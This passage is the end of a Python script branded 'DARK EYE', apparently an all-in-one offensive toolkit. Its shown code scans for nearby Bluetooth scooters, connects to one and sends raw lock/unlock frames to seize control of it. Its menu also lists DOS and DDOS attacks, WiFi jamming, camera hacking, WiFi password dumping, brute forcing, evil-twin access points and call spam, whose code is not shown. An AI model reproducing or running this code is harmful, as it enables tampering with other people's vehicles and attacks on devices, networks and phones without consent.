    from bleak import BleakScanner, BleakClient
    cprint("[*] Scanning BLE (8s)...", DR)

    async def scan():
        devs = await BleakScanner.discover(timeout=8)
        found = [d for d in devs if d.name and any(k in d.name.upper() for k in
                 ("M365", "MI", "NINEBOT", "SCOOT", "MAX", "PRO", "ES", "SCOOTER"))]
        found = found or [d for d in devs if d.name]
        if not found:
            cprint("[x] Nothing found.", RD); return None
        for i, d in enumerate(found):
            cprint(f"  {i}: {d.name}  {d.address}", RD)
        return found[int(ask("Pick index", "0"))]

    dev = asyncio.run(scan())
    if not dev:
        return

    async def work():
        cprint(f"[*] Connecting {dev.address}...", DR)
        async with BleakClient(dev.address, timeout=20) as cl:
            cprint("[+] Connected.", WH)
            target = None
            for s in cl.services:
                for c in s.characteristics:
                    if "write" in c.properties or "write-without-response" in c.properties:
                        target = c; break
                if target:
                    break
            if not target:
                cprint("[x] No write characteristic.", RD); return
            frames = {
                "unlock": bytes([0x55, 0xAA, 0x04, 0x21, 0x21, 0x04, 0x01] + [0] * 12),
                "lock":   bytes([0x55, 0xAA, 0x04, 0x21, 0x20, 0x04, 0x01] + [0] * 12),
            }
            action = ask("Action lock/unlock", "unlock")
            await cl.write_gatt_char(target, frames.get(action, frames["unlock"]), response=False)
            cprint(f"[+] {action} frame sent.", WH)
            time.sleep(0.8)
            for s in cl.services:
                for c in s.characteristics:
                    if "read" in c.properties:
                        try:
                            v = (await cl.read_gatt_char(c)).hex()
                            if v.strip("0"):
                                cprint(f"  {c.uuid[:8]} -> {v[:40]}", GY)
                        except Exception:
                            pass
            cprint("[i] Frames differ per model.", GY)

    try:
        asyncio.run(work())
    except Exception as e:
        cprint(f"[x] {e}", RD)

# ============================================================================
#  MENU
# ============================================================================
MENU = [
    ("IP tracer", ip_tracer),
    ("Phone tracer", phone_tracer),
    ("DOS", dos),
    ("DDOS", ddos),
    ("WiFi DOS", dos_wifi),
    ("BLE spam", ble_spam),
    ("Camera hack", camera_hack),
    ("WhatsApp", whatsapp),
    ("WiFi scan", wifi_scan),
    ("WiFi password dump", wifi_password),
    ("Password brute force", password_brutal),
    ("Fake WiFi (evil twin)", fake_wifi),
    ("Call spam", call_spam),
    ("Scoot hack", scoot_hack),
    ("EXIT", None),
]

def menu():
    while True:
        clear()
        w = W()
        print()
        for i, ln in enumerate(BANNER):
            cprint(f"{B if i % 3 else ''}{RD}{ln.center(w)}{R}")
        print()
        hr("═", DR)
        for i, (name, _) in enumerate(MENU, 1):
            col = WH if name == "EXIT" else RD
            print(f"  {B}{col}[{i:>2}]{R}  {name}")
        hr("═", DR)
        try:
            ch = input(f"{RD}darkeye{R}@{DR}menu{R} {RD}>{R} ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not ch.isdigit() or not (1 <= int(ch) <= len(MENU)):
            continue
        name, fn = MENU[int(ch) - 1]
        if fn is None:
            clear()
            cprint(center("\n\n☢   D A R K   E Y E   o f f l i n e   ☢\n"), B + RD)
            print("\n")
            break
        clear()
        try:
            fn()
        except KeyboardInterrupt:
            cprint("\n[!] Interrupted.", DR)
        except Exception as e:
            cprint(f"\n[x] Error: {e}", RD)
        pause()

def main():
    if IS_WIN:
        os.system("title DARK EYE")
    intro()
    menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Terminated.", DR)